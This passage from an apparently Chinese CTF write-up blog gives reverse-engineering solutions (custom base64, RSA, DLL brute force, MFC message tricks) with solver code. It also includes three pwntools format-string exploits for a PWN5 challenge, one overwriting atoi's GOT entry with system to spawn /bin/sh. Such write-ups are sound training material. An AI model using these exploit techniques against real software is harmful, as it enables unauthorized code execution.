class="number">0x45</span>,<span class="number">0x70</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x73</span>,<span class="number">0x35</span>,<span class="number">0x51</span>,<span class="number">0x50</span>,<span class="number">0x47</span>,<span class="number">0x2B</span>,<span class="number">0x4B</span>,<span class="number">0x4C</span>,<span class="number">0x30</span>,<span class="number">0x54</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x2F</span>,<span class="number">0x34</span>,<span class="number">0x30</span>,<span class="number">0x6E</span>,<span class="number">0x62</span>,<span class="number">0x55</span>,<span class="number">0x3D</span>])</span><br><span class="line">print(len(s))</span><br><span class="line"><span class="comment"># key = bytes(&#x27;1234&#x27;,encoding=&#x27;utf-8&#x27;)</span></span><br><span class="line">key = <span class="string">b&#x27;t\x00e\x00s\x00t\x00&#x27;</span></span><br><span class="line">s = base64.b64decode(s)</span><br><span class="line">print(s,len(s))</span><br><span class="line">print(key,len(key))</span><br><span class="line">des = DES.new(key=key,mode=DES.MODE_CBC,iv=key)</span><br><span class="line">res = des.decrypt(s)</span><br><span class="line">print(res)</span><br><span class="line">print(res.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019SCTF">2019SCTF – ctfwp</a></p>
<h2 id="rev-NPUCTF2020-Baby-Obfuscation"><a href="#rev-NPUCTF2020-Baby-Obfuscation" class="headerlink" title="[rev][NPUCTF2020]Baby Obfuscation"></a>[rev][NPUCTF2020]Baby Obfuscation</h2><ol>
<li><p>F0X1</p>
<p>辗转相除法求a,b最大公约数</p>
</li>
<li><p>F0X4</p>
<p><del>(</del>a + b)=~(-a+b-1)=-(b-a-1)-1=a-b</p>
</li>
<li><p>F0X5</p>
<p>快速幂</p>
</li>
<li><p>F0X3</p>
<p> a&amp;&amp;b</p>
</li>
<li><p>F0X2</p>
<p> !a&amp;&amp;!b</p>
</li>
<li><p>for循环</p>
<ol>
<li><p>第一个if</p>
<p>v33[j]=<del>(</del>str[j-1]+v35[(j-1)%4+4])=str[j-1]-v35[(j-1)%4+4]</p>
</li>
<li><p>第二个if不可能执行</p>
</li>
<li><p>第三个if</p>
<p>v33[j]^=v35[(j-1)%4+4]</p>
</li>
<li><p>第四个if必不执行</p>
</li>
<li><p>v33[j]*=10</p>
</li>
</ol>
</li>
<li><p>字符串长度为15</p>
</li>
<li><p>比对</p>
<p>(A0X6[k+1]-1)/10==v33[k]</p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;setjmp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* name, <span class="keyword">uint8_t</span>* data, <span class="keyword">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;==============%s========&quot;</span>, name);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(i % <span class="number">16</span>))<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%02x,&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n================================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123;<span class="number">0x1e79</span>, <span class="number">0x1e79</span>, <span class="number">0x2135</span>, <span class="number">0x170d</span>, <span class="number">0x1f41</span>, <span class="number">0x1901</span>, <span class="number">0x2ced</span>, <span class="number">0x11f9</span>, <span class="number">0x2649</span>, <span class="number">0x2581</span>, <span class="number">0x2db5</span>, <span class="number">0x14b5</span>, <span class="number">0x25e5</span>, <span class="number">0x2a31</span>, <span class="number">0x30d5</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">16</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> xorD[] = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">15</span>;i++)&#123;</span><br><span class="line">        a[i]-=<span class="number">1</span>;</span><br><span class="line">        a[i]/=<span class="number">100</span>;</span><br><span class="line">        a[i]^=xorD[i%<span class="number">4</span>];</span><br><span class="line">        flag[i]=a[i]+xorD[i%<span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="rev-De1CTF2019-Re-Sign"><a href="#rev-De1CTF2019-Re-Sign" class="headerlink" title="[rev][De1CTF2019]Re_Sign"></a>[rev][De1CTF2019]Re_Sign</h2><ol>
<li>UPX加壳了，可是upx官方版说没加壳，使用upx官方版加壳又说加壳了= =，只好手动脱壳。具体操作为pushad之后栈上下硬件断点，F9到popad之后有个long jmp，jmp之后再单步调试法找到OEP在0x401000。之后使用Scylla插件dump内存为可执行文件，并且dump之后fix_dump</li>
<li>程序使用了什么库(搜不到)，只能一步一步尝试</li>
<li>关键函数<ul>
<li>401233使用了换表base64编码，调试发现的，具体生成表操作在401615到4016F0之间</li>
<li>402160再找到字母在标准b64表中的位置</li>
</ul>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm+/=&#x27;</span></span><br><span class="line"></span><br><span class="line">print(len(s))</span><br><span class="line">b64tab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">dicn = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65</span>):</span><br><span class="line">    dic[s[i]]=b64tab[i]</span><br><span class="line">    dicn[b64tab[i]]=i</span><br><span class="line"></span><br><span class="line">fa = [<span class="number">0x08</span>,<span class="number">0x3B</span>,<span class="number">0x01</span>,<span class="number">0x20</span>,<span class="number">0x07</span>,<span class="number">0x34</span>,<span class="number">0x09</span>,<span class="number">0x1F</span>,<span class="number">0x18</span>,<span class="number">0x24</span>,<span class="number">0x13</span>,<span class="number">0x03</span>,<span class="number">0x10</span>,<span class="number">0x38</span>,<span class="number">0x09</span>,<span class="number">0x1B</span>,<span class="number">0x08</span>,<span class="number">0x34</span>,<span class="number">0x13</span>,<span class="number">0x02</span>,<span class="number">0x08</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x06</span>,<span class="number">0x12</span>,<span class="number">0x03</span>,<span class="number">0x0F</span>,<span class="number">0x22</span>,<span class="number">0x12</span>,<span class="number">0x17</span>,<span class="number">0x08</span>,<span class="number">0x01</span>,<span class="number">0x29</span>,<span class="number">0x22</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x32</span>,<span class="number">0x24</span>,<span class="number">0x0F</span>,<span class="number">0x1F</span>,<span class="number">0x2B</span>,<span class="number">0x24</span>,<span class="number">0x03</span>,<span class="number">0x15</span>,<span class="number">0x41</span>,<span class="number">0x41</span>]</span><br><span class="line">fs = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fa:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    fs+=b64tab[i<span class="number">-1</span>]</span><br><span class="line">print(fs)</span><br><span class="line">sfs = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fs:</span><br><span class="line">    sfs+=dic[i]</span><br><span class="line">print(sfs)</span><br><span class="line">print(base64.b64decode(bytes(sfs,encoding=<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure>

<h2 id="rev-HellScream"><a href="#rev-HellScream" class="headerlink" title="[rev]HellScream"></a>[rev]HellScream</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BigInteger</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">int</span> data[MAX_LEN];</span><br><span class="line">&#125; BigInteger;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>4019F0 a1的元素左移4位copy到a2上</p>
</li>
<li><p>401940 a2的元素加到a1第一个dword上，溢出则溢出部分加到第二个数上面，以此类推</p>
<p>从这里看出实现了一个大整数运算库</p>
</li>
<li><p>406330 把int值转化成对应的base16串，小端字节序</p>
</li>
<li><p>405310 把BigInteger放入数组</p>
</li>
<li><p>406230 直接把字符串放入username对应的结构体data字段</p>
</li>
<li><p>4020E0 根据406330得出大概是mod()，并且有三个参数，分别是被除数(也是余数的存放位置),商存放位置，除数</p>
</li>
<li><p>403E30 猜测是mod n</p>
</li>
<li><p>4018E0 复制String</p>
</li>
<li><p>401910 将a1初始化为String且初始值为a2</p>
</li>
<li><p>401510 check函数</p>
<ul>
<li>最终input=Happy Birthday Buddy</li>
<li>核心逻辑似乎在401000</li>
<li>4062A0 把结构体中的数据提取到input</li>
<li>4064D0 pow mod n</li>
</ul>
</li>
</ol>
<p>看题解了，RSA算法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xA324F100182D501F6F6F78F397A3AA59641023D6A3DED8A4BF344F1E0FC71C188F4D</span></span><br><span class="line">p = <span class="number">62822928286347608648869628628072621308819</span></span><br><span class="line">q = <span class="number">76979057716441943100156208562083628995999</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">e = powmod(<span class="number">0x6D6F632E6D736131352E777777</span>,<span class="number">17</span>,n)</span><br><span class="line"><span class="comment"># m = 0x6B6F007964647542207961646874726942207970706148 # Happy Birthday Buddy\x00ok</span></span><br><span class="line">m = <span class="number">0x7964647542207961646874726942207970706148</span></span><br><span class="line"><span class="comment"># E &lt;= e+99</span></span><br><span class="line">d = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    E = e+i</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d=invert(E,phi)</span><br><span class="line">        print(i)</span><br><span class="line">        print(hex(powmod(m,d,n)).upper())</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">r = <span class="number">0x1234567890</span></span><br><span class="line">print(hex(e))</span><br></pre></td></tr></table></figure>

<h2 id="rev-Snake"><a href="#rev-Snake" class="headerlink" title="[rev]Snake"></a>[rev]Snake</h2><p>总是纠结于Assembly-CSharp.dll，实际上flag不在里面啊555</p>
<ol>
<li>查看各个类，发现有个Interface类是C代码写的，所以应该找到这个Interface，使用IDA打开</li>
<li>然后查看各个方法的参考，其中GameObject在Move中被调用，传入的参数为x，y坐标，所以不会很大，观察常量为199</li>
<li>直接加载dll爆破flag即可</li>
<li>查看dll，利用了大整数库，应该是公钥加密之类的</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HMODULE hMod = LoadLibraryA(<span class="string">&quot;C:\\Users\\Tom\\Downloads\\Snake\\Snake_Data\\Plugins\\Interface.dll&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">int64_t</span> <span class="params">(*FuncPtr)</span><span class="params">(<span class="keyword">int</span> i)</span></span>;</span><br><span class="line">    FuncPtr func = (FuncPtr) GetProcAddress(hMod,<span class="string">&quot;GameObject&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(hMod==<span class="literal">NULL</span>||func==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Load Failed&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">200</span>;i++)&#123;</span><br><span class="line">        func(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag{Ch4rp_W1th_R$@}</p>
<h2 id="rev-HDCTF2019-MFC"><a href="#rev-HDCTF2019-MFC" class="headerlink" title="[rev][HDCTF2019]MFC"></a>[rev][HDCTF2019]MFC</h2><p>MFC程序逆向</p>
<ol>
<li>程序加了VMP，一时半会儿弄不出来</li>
<li>使用xspy得到一个奇怪的消息码：0x464</li>
<li>使用对应的消息码给程序发消息，得到一个des key</li>
<li>使用CE搜索Flag，发现上方不远处有一串字符串，就是加密过的文本</li>
</ol>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    HWND h = FindWindowW(<span class="literal">NULL</span>,<span class="string">L&quot;Flag就在控件里&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(h==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        SendMessage(h,<span class="number">0x464</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptdes">http://tool.chacuo.net/cryptdes</a></p>
<h2 id="pwn-第五空间2019-决赛-PWN5"><a href="#pwn-第五空间2019-决赛-PWN5" class="headerlink" title="[pwn][第五空间2019 决赛]PWN5"></a>[pwn][第五空间2019 决赛]PWN5</h2><p>printf可以实现任意地址读写</p>
<p>任意地址写的payload可以使用fmtstr_payload方法生成</p>
<h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>在随机数出写入自定义的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">payload = p32(addr)+p32(addr+<span class="number">1</span>)+p32(addr+<span class="number">2</span>)+p32(addr+<span class="number">3</span>)</span><br><span class="line">payload +=<span class="string">r&#x27;%10$hhn&#x27;</span>+<span class="string">r&#x27;%11$hhn&#x27;</span>+<span class="string">r&#x27;%12$hhn&#x27;</span>+<span class="string">r&#x27;%13$hhn&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x10101010</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p>修改atoi函数的got表指向system，然后传/bin/sh</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn-1&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_addr = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;atoi_addr:sys_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p>读取随机数的值，然后填那个值，需要注意符号。很不稳定，容易出现溢出，比如说正负数问题，只有在随机数为正时可以pwn</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn-1&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">payload = p32(addr)+<span class="string">r&#x27;%10$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello,&#x27;</span>)</span><br><span class="line">res = p.recv()</span><br><span class="line">rand = u32(res[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">print(hex(rand))</span><br><span class="line">p.sendline(str(rand))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0501f4dbaf9e">BUUCTF - [第五空间2019 决赛]PWN5</a></p>
<h2 id="rev-ACTF新生赛2020-Splendid-MineCraft"><a href="#rev-ACTF新生赛2020-Splendid-MineCraft" class="headerlink" title="[rev][ACTF新生赛2020]Splendid_MineCraft"></a>[rev][ACTF新生赛2020]Splendid_MineCraft</h2><p>自修改代码</p>
<ol>
<li>第一段flag验证的函数开头有个自修改，直接patch之后更改跳转地址</li>
<li>第二段的比较，当时傻了，每一个byte都可以找任意地址的，然后找到地址的差</li>
<li>第三段直接明文比较</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 